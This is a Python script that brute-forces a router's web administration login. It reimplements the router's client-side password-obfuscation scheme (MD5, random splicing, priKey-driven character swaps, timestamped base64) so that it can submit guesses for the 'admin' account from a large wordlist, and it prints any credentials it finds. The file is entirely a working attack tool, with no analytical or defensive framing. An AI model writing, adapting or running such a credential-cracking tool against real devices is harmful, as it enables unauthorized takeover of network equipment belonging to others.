import requests
import hashlib
import time
import base64
import random
from tqdm import tqdm
import os

# Setup
router_url = "http://10.141.42.79"
login_info_url = f"{router_url}/goform/GetLoginInfo"
login_url = f"{router_url}/goform/login"

# Common usernames; consider loading from file in future
# usernames = ["admin", "root", "user", "administrator"]
usernames = ["admin"]

password_path = "/Volumes/1TB/cracking/lists/cyclone_hk.txt"

# Optimized wordlist loading
def count_lines(file_path):
    """Count the number of non-empty lines in the file"""
    count = 0
    with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
        for line in f:
            if line.strip():
                count += 1
    return count

def load_wordlist(path, batch_size=1000):
    """Load passwords from wordlist in efficient batches"""
    total_passwords = count_lines(path)
    print(f"Wordlist contains {total_passwords} passwords")
    
    with open(path, "r", encoding="utf-8", errors="ignore") as f:
        passwords = []
        for line in f:
            password = line.strip()
            if password:
                passwords.append(password)
                if len(passwords) >= batch_size:
                    for pwd in passwords:
                        yield pwd
                    passwords = []
        
        # Yield any remaining passwords
        for pwd in passwords:
            yield pwd

def get_login_info():
    for retry in range(3):
        try:
            r = requests.get(login_info_url, timeout=5)
            data = r.json()
            if not data or "priKey" not in data or not data["priKey"]:
                raise ValueError("Invalid or empty priKey received from router")
            
            priKey_value = data["priKey"]
            
            # Handle the case where priKey starts with 'x' (like "x12ba")
            if priKey_value.startswith('x'):
                # Use a default value for priKey and extract timestamp
                priKey = "0"  # Default value
                timestamp = priKey_value[1:]  # Remove the 'x' prefix
            else:
                # Normal case: priKey is in format "value1xvalue2"
                parts = priKey_value.split("x")
                if len(parts) != 2:
                    raise ValueError(f"Invalid priKey format: {priKey_value}")
                priKey, timestamp = parts
            
            return priKey, timestamp, int(time.time())
        except Exception as e:
            print(f"⚠️ Error getting login info: {e} - Attempt {retry+1}/3")
            if retry < 2:  # Wait before retrying, except on the last attempt
                time.sleep(2)
    
    # If we reach here, all attempts failed
    raise ConnectionError("Failed to get valid login info after 3 attempts")

def base64_encode_custom(message):
    return base64.b64encode(message.encode()).decode()

def replace_char_at(s, index, char):
    """Replace character at index in string s with char"""
    return s[:index] + char + s[index+1:]

def check_password_type(pwd):
    """Determine the type of password for charset selection"""
    if not pwd:
        return 'mix_all'
    isnum = pwd.isdigit()
    islower = pwd.islower()
    isupper = pwd.isupper()
    isspec = all(not c.isalnum() for c in pwd)
    if isnum:
        return 'number'
    elif islower:
        return 'lower'
    elif isupper:
        return 'upper'
    elif isspec:
        return 'spec'
    elif any(c.isdigit() for c in pwd) and any(c.islower() for c in pwd) and any(c.isupper() for c in pwd):
        return 'alpha_num'
    elif any(c.isalnum() for c in pwd) and any(not c.isalnum() for c in pwd):
        return 'mix_all'
    return 'mix_all'

def get_charset(pwd_type):
    """Get charset based on password type"""
    # For simplicity, use mix_all
    return list("1234567890abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ~!@#$%^&*()_+{}:|'[]?,./-=") * 10

def password_encode(password, secret, timestamp, timestamp_start):
    """Encode password using the same algorithm as the router"""
    # Determine password type and get appropriate charset
    pwd_type = check_password_type(password)
    charset = get_charset(pwd_type)

    # Generate random data for splicing
    num14 = random.randint(1, 4)
    num255 = [random.randint(0, 255) for _ in range(num14)]
    splice_str = ''.join([charset[i % len(charset)] for i in num255])
    splic_pwd = splice_str + password

    # Apply transformations
    parse16 = int(secret, 16)
    for i in range(4):
        idx1 = ((parse16 >> (i * 8)) & 0xff) % len(splic_pwd)
        idx2 = i % len(splic_pwd)
        # Swap characters
        char1 = splic_pwd[idx1]
        char2 = splic_pwd[idx2]
        splic_pwd = replace_char_at(splic_pwd, idx1, char2)
        splic_pwd = replace_char_at(splic_pwd, idx2, char1)

    # Create message with timestamp
    random1 = ''.join([f"{x:02x}" for x in num255])
    time_diff = int(time.time()) - timestamp_start
    time_stamp = int(timestamp, 16) + time_diff
    message = f"{random1}x{time_stamp:x}:{splic_pwd}"
    base64_str = base64_encode_custom(message)

    # Apply further transformations to base64 string
    for i in range(4):
        idx1 = ((parse16 >> (i * 8)) & 0xff) % len(base64_str)
        idx2 = i % len(base64_str)
        # Swap characters
        char1 = base64_str[idx1]
        char2 = base64_str[idx2]
        base64_str = replace_char_at(base64_str, idx1, char2)
        base64_str = replace_char_at(base64_str, idx2, char1)

    return base64_str

def try_login(username, raw_password):
    max_retries = 3
    for attempt in range(max_retries):
        try:
            # Get login info with retry mechanism built-in
            priKey, timestamp, timestamp_start = get_login_info()
            
            # Continue with login attempt
            md5pass = hashlib.md5(raw_password.encode()).hexdigest()
            encoded_pass = password_encode(md5pass, priKey, timestamp, timestamp_start)

            payload = {
                "username": username,
                "password": encoded_pass
            }

            r = requests.post(login_url, json=payload, timeout=5)
            resp = r.json()
            if resp.get("retcode") == 0:
                return True
            else:
                return False
        except ConnectionError as e:
            # If we can't connect to the router, wait longer before retry
            if attempt < max_retries - 1:
                print(f"⚠️ Connection error with {username}:{raw_password} — {e} — waiting...")
                time.sleep(5)  # Longer wait for connection issues
        except Exception as e:
            if attempt < max_retries - 1:
                print(f"⚠️ Error with {username}:{raw_password} — {e} — retrying...")
                time.sleep(2)
    
    # If we reach here, all attempts failed
    print(f"❌ Skipping {username}:{raw_password} after {max_retries} failed attempts")
    return False

# Main execution
if __name__ == "__main__":
    start_time = time.time()
    attempts = 0
    failed_count = 0
    
    # Count total passwords for progress tracking
    try:
        total_passwords = count_lines(password_path)
    except Exception as e:
        print(f"Error counting passwords: {e}")
        total_passwords = 0  # Will show ? in progress bar if unknown
    
    for username in usernames:
        # Create progress bar for brute force attempts
        with tqdm(total=total_passwords, desc=f"Brute forcing {username}", unit="pwd") as pbar:
            for password in load_wordlist(password_path):
                attempts += 1
                
                try:
                    result = try_login(username, password)
                    
                    if result:
                        tqdm.write(f"✅ SUCCESS: {username}:{password}")
                        elapsed = time.time() - start_time
                        tqdm.write(f"Found after {attempts} attempts in {elapsed:.2f} seconds")
                        exit(0)
                    else:
                        failed_count += 1
                        if attempts % 10 == 0:  # Only update display occasionally to reduce overhead
                            elapsed = time.time() - start_time
                            rate = attempts / elapsed if elapsed > 0 else 0
                            tqdm.write(f"❌ Failed: {username}:{password} | {rate:.2f} attempts/sec")
                
                except Exception as e:
                    failed_count += 1
                    tqdm.write(f"❌ Unhandled error: {e}")
                
                # Always update progress bar
                pbar.update(1)
                
                # If too many consecutive failures, add a delay to avoid overwhelming the router
                if failed_count > 20:
                    tqdm.write("⚠️ Too many consecutive failures, pausing for 10 seconds...")
                    time.sleep(10)
                    failed_count = 0
            
    print(f"Exhausted wordlist. Tried {attempts} passwords in {time.time() - start_time:.2f} seconds")
        